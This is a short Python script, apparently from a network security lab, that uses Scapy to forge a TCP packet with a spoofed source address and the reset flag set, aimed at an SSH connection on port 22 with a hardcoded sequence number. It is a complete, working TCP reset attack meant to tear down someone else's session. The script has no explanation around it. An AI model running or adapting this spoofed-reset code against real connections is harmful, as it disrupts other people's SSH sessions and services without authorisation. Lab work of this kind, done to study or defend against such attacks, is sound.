#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.11.2.5", dst="10.2.11.6")
tcp = TCP(sport=51458, dport=22, flags="R", seq=2264913361)

pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
